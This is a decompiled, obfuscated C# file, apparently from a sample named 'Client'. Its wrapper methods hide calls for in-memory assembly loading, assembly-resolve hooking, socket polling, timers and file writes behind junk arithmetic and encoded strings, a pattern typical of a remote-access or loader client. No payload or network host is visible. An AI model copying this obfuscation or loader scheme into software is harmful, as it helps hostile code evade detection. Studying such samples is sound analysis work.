using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.Configuration;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;
using System.Timers;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using ns0;

namespace Client.My;

[GeneratedCode("MyTemplate", "8.0.0.0")]
[EditorBrowsable(EditorBrowsableState.Never)]
internal sealed class MyApplication : ConsoleApplicationBase
{
	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 2300)]
	private struct Struct0
	{
	}

	private static bool bool_0;

	private static readonly Array array_0;

	private static readonly object object_0;

	private static readonly Array array_1;

	internal static byte byte_0/* Not supported: data(00) */;

	static MyApplication()
	{
		object_0 = new char[1150];
		char[] array = new char[8];
		array[1] = '㯿';
		array[5] = '≇';
		array[6] = '౾';
		array[4] = '⏝';
		array[0] = 'Ẓ';
		array[3] = 'Ꮫ';
		array[2] = '㷂';
		array[7] = '⏸';
		array_1 = new string[89];
		array_0 = array;
		smethod_0();
	}

	internal static void smethod_0()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_0027: Expected O, but got Unknown
		if (bool_0)
		{
			return;
		}
		_Type val = (_Type)typeof(MyApplication);
		Type gparam_ = (Type)val;
		Class11.smethod_0((object)val, 182, 222);
		try
		{
			if (!bool_0)
			{
				bool_0 = true;
				Class11.Class15.smethod_0<AppDomain, ResolveEventHandler>(Class11.Class12.smethod_0(902, 989), Class5.Class6.smethod_0, 'D', 'v');
			}
		}
		finally
		{
			Class11.smethod_0((object)gparam_, 291, 330);
		}
	}

	internal static SettingsBase smethod_1<T>(T gparam_0, int int_0, int int_1) where T : SettingsBase
	{
		int num = 0;
		SettingsBase result = (SettingsBase)((((int_1 ^ int_0) - 104) ^ 0) switch
		{
			0 => Class11.Class15.smethod_2<SettingsBase>((SettingsBase)(object)gparam_0, (short)301, (short)337), 
			_ => null, 
		});
		num++;
		return result;
	}

	internal static string smethod_2<T, U>(U gparam_0, T gparam_1, short short_0, int int_0) where T : string where U : string
	{
		int num = 0;
		string result;
		do
		{
			result = (((short_0 ^ int_0) - 0) ^ num) switch
			{
				1 => (string)(ICloneable)Class16.smethod_2((string)gparam_0, (string)gparam_1, '\u0347', '\u0337'), 
				0 => (string)(ICloneable)Class16.smethod_2((string)gparam_0, (string)gparam_1, 'ª', 'Ú'), 
				_ => null, 
			};
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	internal static AppDomain smethod_3(char char_0, char char_1)
	{
		int num = 0;
		AppDomain result;
		int num2;
		do
		{
			result = (((char_0 ^ char_1) - 44) ^ num) switch
			{
				0 => Class11.Class12.smethod_0(887, 812), 
				_ => null, 
			};
			num++;
			num2 = char_1 * char_1;
			num2 = char_1 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static void smethod_4(int int_0, short short_0, char char_0)
	{
		int num = 0;
		switch (((short_0 ^ char_0) - 29) ^ 0)
		{
		case 0:
			Class16.smethod_4(int_0, 535, 'ȣ');
			break;
		}
		num++;
	}

	internal static Assembly smethod_5<T>(byte[] byte_1, byte[] byte_2, T gparam_0, char char_0, char char_1) where T : Evidence
	{
		int num = 0;
		Assembly result;
		do
		{
			result = (((char_1 ^ char_0) - 29) ^ num) switch
			{
				0 => (Assembly)(ICustomAttributeProvider)Class11.Class12.Class14.smethod_5(byte_1, byte_2, (Evidence)gparam_0, 'Ì', 236), 
				_ => null, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static bool smethod_6<T, U>(T gparam_0, U gparam_1, int int_0, short short_0)
	{
		int num = 0;
		bool result;
		int num2;
		do
		{
			result = (((int_0 ^ short_0) - 44) ^ num) switch
			{
				0 => Class11.Class15.smethod_5((object)gparam_0, (object)gparam_1, '\u02f2', '\u02dd'), 
				_ => false, 
			};
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static bool smethod_7<T>(T gparam_0, int int_0, SelectMode selectMode_0, char char_0, short short_0) where T : Socket
	{
		int num = 0;
		bool result = (((char_0 ^ short_0) - 12) ^ 0) switch
		{
			0 => Class11.smethod_11((Socket)gparam_0, int_0, selectMode_0, 'ʈ', 'ʕ'), 
			_ => false, 
		};
		num++;
		return result;
	}

	internal static string smethod_8<T>(T gparam_0, char char_0, short short_0) where T : string
	{
		int num = 0;
		string result;
		do
		{
			result = (((char_0 ^ short_0) - 118) ^ num) switch
			{
				3 => (string)(IEnumerable)Class11.Class12.Class14.smethod_6((string)gparam_0, 29, (short)39), 
				2 => (string)(IEnumerable)Class11.Class12.Class14.smethod_6((string)gparam_0, 986, (short)995), 
				1 => (string)(IEnumerable)Class11.Class12.Class14.smethod_6((string)gparam_0, 386, (short)442), 
				0 => (string)(IEnumerable)Class11.Class12.Class14.smethod_6((string)gparam_0, 87, (short)96), 
				_ => null, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static void smethod_9<T, U>(T gparam_0, U gparam_1, short short_0, short short_1) where T : string where U : string
	{
		int num = 0;
		int num2;
		do
		{
			switch (((short_1 ^ short_0) - 127) ^ num)
			{
			case 0:
				Class11.Class12.Class14.smethod_8((string)gparam_0, (string)gparam_1, '^', 92);
				break;
			}
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static void smethod_10<T>(T gparam_0, int int_0, short short_0) where T : Timer
	{
		int num = 0;
		int num2;
		do
		{
			switch (((int_0 ^ short_0) - 52) ^ num)
			{
			case 0:
				Class11.smethod_16((Timer)gparam_0, 154, 133);
				break;
			}
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static string smethod_11<T>(T gparam_0, char char_0, int int_0) where T : OperatingSystem
	{
		int num = 0;
		string result;
		do
		{
			result = (((char_0 ^ int_0) - 84) ^ num) switch
			{
				0 => (string)(IConvertible)Class11.Class12.Class14.smethod_10((OperatingSystem)gparam_0, 260, 362), 
				_ => null, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static byte[] smethod_12<T>(T gparam_0, char char_0, int int_0) where T : string
	{
		int num = 0;
		byte[] result;
		int num2;
		do
		{
			result = (((char_0 ^ int_0) - 66) ^ num) switch
			{
				0 => Class11.Class12.smethod_4((string)gparam_0, 47, (short)99), 
				_ => null, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static void smethod_13<T>(T gparam_0, byte[] byte_1, int int_0, char char_0) where T : string
	{
		int num = 0;
		switch (((int_0 ^ char_0) - 126) ^ 0)
		{
		case 0:
			Class11.Class15.smethod_11((string)gparam_0, byte_1, 'Ȫ', 560);
			break;
		}
		num++;
	}

	internal static char smethod_14<T>(T gparam_0, int int_0, short short_0, short short_1) where T : string
	{
		int num = 0;
		char result = (((short_1 ^ short_0) - 79) ^ 0) switch
		{
			0 => Class11.smethod_17((string)gparam_0, int_0, 'ɂ', 638), 
			_ => '5', 
		};
		num++;
		return result;
	}

	internal static string smethod_15<T>(T gparam_0, char char_0, char char_1) where T : StringBuilder
	{
		int num = 0;
		string result;
		int num2;
		do
		{
			result = (((char_1 ^ char_0) - 112) ^ num) switch
			{
				0 => (string)(IEquatable<string>)Class11.Class12.Class14.smethod_12((StringBuilder)gparam_0, (short)649, 641), 
				_ => null, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static void smethod_16<T>(T gparam_0, short short_0, int int_0) where T : StreamWriter
	{
		int num = 0;
		switch (((int_0 ^ short_0) - 58) ^ 0)
		{
		case 0:
			Class11.Class15.smethod_12((StreamWriter)gparam_0, 983, 'Ϝ');
			break;
		}
		num++;
	}

	internal static string smethod_17<T>(T gparam_0, short short_0, int int_0)
	{
		int num = 0;
		string result = (((int_0 ^ short_0) - 12) ^ 0) switch
		{
			0 => (string)(IEquatable<string>)Class11.smethod_3((object)gparam_0, 840, 788), 
			1 => (string)(IEquatable<string>)Class11.smethod_3((object)gparam_0, 854, 779), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static byte[] smethod_18<T, U>(U gparam_0, T gparam_1, int int_0, short short_0) where T : string where U : Encoding
	{
		int num = 0;
		byte[] result;
		int num2;
		do
		{
			result = (((short_0 ^ int_0) - 4) ^ num) switch
			{
				0 => (byte[])(IEnumerable)Class11.Class12.smethod_9((Encoding)gparam_0, (string)gparam_1, '\'', 108), 
				_ => null, 
			};
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static FileSystemProxy smethod_19<T>(T gparam_0, char char_0, int int_0) where T : ServerComputer
	{
		int num = 0;
		FileSystemProxy result = (FileSystemProxy)((((int_0 ^ char_0) - 57) ^ 0) switch
		{
			0 => Class11.smethod_21<ServerComputer>((ServerComputer)(object)gparam_0, (short)691, 'ʹ'), 
			_ => null, 
		});
		num++;
		return result;
	}

	internal static object smethod_20<T, U, V>(V gparam_0, T gparam_1, U gparam_2, object[] object_1, string[] string_0, Type[] type_0, bool[] bool_1, char char_0, char char_1) where T : Type where U : string
	{
		int num = 0;
		object result;
		do
		{
			result = (((char_1 ^ char_0) - 75) ^ num) switch
			{
				0 => Class11.smethod_7((object)gparam_0, (Type)gparam_1, (string)gparam_2, object_1, string_0, type_0, bool_1, 'ɗ', 'ȫ'), 
				_ => null, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}
}
